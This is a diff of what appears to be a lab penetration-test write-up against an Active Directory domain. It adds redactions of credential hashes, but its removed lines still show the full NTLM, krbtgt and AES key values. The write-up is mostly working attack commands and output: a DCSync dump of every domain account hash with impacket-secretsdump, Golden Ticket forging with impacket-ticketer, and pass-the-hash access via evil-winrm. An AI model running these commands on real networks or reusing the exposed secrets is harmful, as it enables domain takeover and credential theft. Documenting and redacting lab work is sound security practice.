@@ -40,7 +40,7 @@ sequenceDiagram
 
 ```bash
 impacket-secretsdump \
-  -hashes 'aad3b435b51404eeaad3b435b51404ee:bf27edd1b8509ea3e5a081fe7b90564d' \
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:bf27edd1…[REDACTED-NTLM]' \
   'lab.local/administrator@192.168.90.121' \
   -just-dc-ntlm
 ```
@@ -48,15 +48,15 @@ impacket-secretsdump \
 ```
 Dumping Domain Credentials using DRSUAPI method to get NTDS.DIT secrets
 
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:bf27edd1b8509ea3e5a081fe7b90564d:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bf27edd1…[REDACTED-NTLM]:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:434b1005e1d2290df9fc40aa90dab391:::
-lab.local\john.doe:1105:aad3b435b51404eeaad3b435b51404ee:7209d1e2b55d242551d2e7aba8604e47:::
-svc-backup:1106:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
-svc-legacy:1107:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
-WINDOWS-AD-DC$:1000:aad3b435b51404eeaad3b435b51404ee:b4edda5d3d48ea7e10d9dd9a0e967cf5:::
-WIN-AGENT-01$:1103:aad3b435b51404eeaad3b435b51404ee:2fa011e5a30fe4ee3fe52a40f6a92c4c:::
-WIN-AGENT-02$:1104:aad3b435b51404eeaad3b435b51404ee:5628c6acbf07b35d87f2d4a3ebbca38a:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:434b1005…[REDACTED-KRBTGT-NTLM]:::
+lab.local\john.doe:1105:aad3b435b51404eeaad3b435b51404ee:7209d1e2…[REDACTED-HASH]:::
+svc-backup:1106:aad3b435b51404eeaad3b435b51404ee:a9fdfa03…[REDACTED-HASH]:::
+svc-legacy:1107:aad3b435b51404eeaad3b435b51404ee:a9fdfa03…[REDACTED-HASH]:::
+WINDOWS-AD-DC$:1000:aad3b435b51404eeaad3b435b51404ee:b4edda5d…[REDACTED-HASH]:::
+WIN-AGENT-01$:1103:aad3b435b51404eeaad3b435b51404ee:2fa011e5…[REDACTED-HASH]:::
+WIN-AGENT-02$:1104:aad3b435b51404eeaad3b435b51404ee:5628c6ac…[REDACTED-HASH]:::
 ```
 
 All 9 account hashes from the domain. DCSync via DRSUAPI worked cleanly on the first attempt.
@@ -67,14 +67,14 @@ All 9 account hashes from the domain. DCSync via DRSUAPI worked cleanly on the f
 
 ```bash
 impacket-secretsdump \
-  -hashes 'aad3b435b51404eeaad3b435b51404ee:bf27edd1b8509ea3e5a081fe7b90564d' \
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:bf27edd1…[REDACTED-NTLM]' \
   'lab.local/administrator@192.168.90.121' \
   -just-dc-user krbtgt -just-dc
 ```
 
 ```
-krbtgt:aes256-cts-hmac-sha1-96:8b2a169ca9f520782af6787a0e0f3c6591d114fb18842930522d59a3e7d635dd
-krbtgt:aes128-cts-hmac-sha1-96:f67fe1432655a8acbae2d74e517bb35a
+krbtgt:aes256-cts-hmac-sha1-96:8b2a169c…[REDACTED-KRBTGT-AES256]
+krbtgt:aes128-cts-hmac-sha1-96:f67fe143…[REDACTED-KRBTGT-AES128]
 krbtgt:des-cbc-md5:b068c7231f4f3480
 ```
 
@@ -82,7 +82,7 @@ krbtgt:des-cbc-md5:b068c7231f4f3480
 
 ```bash
 impacket-lookupsid 'lab.local/administrator@192.168.90.121' \
-  -hashes 'aad3b435b51404eeaad3b435b51404ee:bf27edd1b8509ea3e5a081fe7b90564d' \
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:bf27edd1…[REDACTED-NTLM]' \
   | grep "Domain SID"
 ```
 
@@ -94,7 +94,7 @@ Domain SID is: S-1-5-21-2386780907-4010950167-3005633723
 
 ```bash
 impacket-ticketer \
-  -nthash 434b1005e1d2290df9fc40aa90dab391 \
+  -nthash 434b1005…[REDACTED-KRBTGT-NTLM] \
   -domain-sid S-1-5-21-2386780907-4010950167-3005633723 \
   -domain lab.local \
   hacker
@@ -119,7 +119,7 @@ After the first failure, the ticket was reforged using the AES256 key and the Do
 
 ```bash
 impacket-ticketer \
-  -aesKey 8b2a169ca9f520782af6787a0e0f3c6591d114fb18842930522d59a3e7d635dd \
+  -aesKey 8b2a169c…[REDACTED-KRBTGT-AES256] \
   -domain-sid S-1-5-21-2386780907-4010950167-3005633723 \
   -domain lab.local \
   -extra-sid S-1-5-21-2386780907-4010950167-3005633723-512 \
@@ -185,7 +185,7 @@ After three failed Golden Ticket attempts, the session pivoted to simply using t
 ```bash
 evil-winrm -i 192.168.90.121 \
   -u administrator \
-  -H bf27edd1b8509ea3e5a081fe7b90564d
+  -H bf27edd1…[REDACTED-NTLM]
 ```
 
 ```
